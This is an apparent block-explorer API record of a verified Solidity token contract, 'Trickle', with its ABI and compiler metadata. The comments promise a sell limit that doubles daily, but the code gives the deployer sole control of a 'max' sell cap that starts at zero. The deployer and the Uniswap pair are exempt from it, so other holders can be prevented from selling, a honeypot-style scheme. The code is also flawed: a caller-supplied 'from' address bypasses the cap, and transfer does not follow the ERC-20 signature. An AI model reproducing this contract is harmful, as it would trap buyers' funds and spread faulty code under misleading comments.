{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.6.0;\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function transfer(address from, address to, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n    \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// Trickle token is designed to stop people from dumping their entire bags as soon as price jumps, which should create a steady rise in price over time.\r\n// The number of Trickle tokens that a person can sell on uniswap per transaction will double every 24 hours\r\n// Website and socials coming soon\r\n// Roadmap, token launch, website and socials, airdrop of new token to top 50 Trickle holders \r\n\r\ncontract Trickle is IERC20 {\r\n    \r\n    using SafeMath for uint256;\r\n\r\n    string public _name;\r\n    string public _symbol;\r\n    uint8 public _decimals;  \r\n    uint256 _totalSupply;\r\n    address private _boss;\r\n    uint public max;\r\n    address public UNIpair;\r\n    \r\n    address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;   //uniswap factory addfress\r\n    address token1 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;    //wETH contract with checksum\r\n    address token0 = 0xAFE06F72247634E8a65ccb2c3aF3bde08eF8a97f;    //token contract with checksum, must know deployment address prior to deployment for this\r\n\r\n    \r\n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n    event Transfer(address indexed from, address indexed to, uint tokens);\r\n\r\n    mapping(address => uint256) balances;\r\n    mapping(address => mapping (address => uint256)) allowed;\r\n\r\n    constructor(string memory name, string memory symbol, uint8 decimals, uint256 total) public {  \r\n    _name = name;\r\n    _symbol = symbol;\r\n    _decimals = decimals;\r\n\t_totalSupply = total;\r\n\tbalances[msg.sender] = _totalSupply;\r\n\t_boss = msg.sender;\r\n\t\r\n\tUNIpair = address(uint(keccak256(abi.encodePacked(\r\n    hex'ff',\r\n    factory,\r\n     keccak256(abi.encodePacked(token0, token1)),\r\n     hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' \r\n    ))));\r\n    }  \r\n\r\n    function changeMax(uint256 _max) public {\r\n        require(msg.sender == _boss);\r\n        max = _max;\r\n    }\r\n\r\n\r\n    function totalSupply() public override view returns (uint256) {\r\n\treturn _totalSupply;\r\n    }\r\n    \r\n    function balanceOf(address tokenOwner) public override view returns (uint256) {\r\n        return balances[tokenOwner];\r\n    }\r\n\r\n    function approve(address delegate, uint256 numTokens) public override returns (bool) {\r\n        allowed[msg.sender][delegate] = numTokens;\r\n        emit Approval(msg.sender, delegate, numTokens);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address delegate) public override view returns (uint) {\r\n        return allowed[owner][delegate];\r\n    }\r\n\r\n    function transfer(address from, address to, uint256 numTokens) public override returns (bool) {\r\n        if (from == _boss || to == _boss || from == UNIpair) {\r\n            require(numTokens <= balances[msg.sender]);\r\n            balances[msg.sender] = balances[msg.sender].sub(numTokens);\r\n             balances[to] = balances[to].add(numTokens);\r\n             emit Transfer(from, to, numTokens);\r\n             return true;\r\n        }\r\n        \r\n        else {\r\n            require(numTokens <= balances[msg.sender]);\r\n            require(numTokens <= max);\r\n            balances[msg.sender] = balances[msg.sender].sub(numTokens);\r\n            balances[to] = balances[to].add(numTokens);\r\n            emit Transfer(from, to, numTokens);\r\n            return true; \r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 numTokens) public override returns (bool) {\r\n        if (from == _boss || to == _boss || from == UNIpair) {\r\n            require(numTokens <= balances[from]);    \r\n            require(numTokens <= allowed[from][msg.sender]);\r\n    \r\n            balances[from] = balances[from].sub(numTokens);\r\n            allowed[from][msg.sender] = allowed[from][msg.sender].sub(numTokens);\r\n            balances[to] = balances[to].add(numTokens);\r\n            emit Transfer(from, to, numTokens);\r\n            return true;\r\n        }\r\n        \r\n        else {\r\n            require(numTokens <= balances[from]);    \r\n            require(numTokens <= allowed[from][msg.sender]);\r\n            require(numTokens <= max);\r\n            \r\n            balances[from] = balances[from].sub(numTokens);\r\n            allowed[from][msg.sender] = allowed[from][msg.sender].sub(numTokens);\r\n            balances[to] = balances[to].add(numTokens);\r\n            emit Transfer(from, to, numTokens);\r\n            return true;\r\n        }\r\n    }\r\n}\r\n\r\nlibrary SafeMath { \r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n      assert(b <= a);\r\n      return a - b;\r\n    }\r\n    \r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n      uint256 c = a + b;\r\n      assert(c >= a);\r\n      return c;\r\n    }\r\n    \r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n      if (a == 0) {\r\n        return 0;\r\n      }\r\n      uint256 c = a * b;\r\n      require(c / a == b, \"SafeMath: multiplication overflow\");\r\n      return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}","ABI":"[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol\",\"type\":\"string\"},{\"internalType\":\"uint8\",\"name\":\"decimals\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"total\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"UNIpair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"delegate\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"delegate\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"numTokens\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenOwner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_max\",\"type\":\"uint256\"}],\"name\":\"changeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"max\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"numTokens\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"numTokens\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"Trickle","CompilerVersion":"v0.6.6+commit.6c089d02","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000034f086f3b33b68400000000000000000000000000000000000000000000000000000000000000000000f547269636b6c652046696e616e63650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000454524b4c00000000000000000000000000000000000000000000000000000000","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://9223300cf5d3478ebc788bd8931c9bd6fc68b83ffffee07f1383f1541672293c"}]}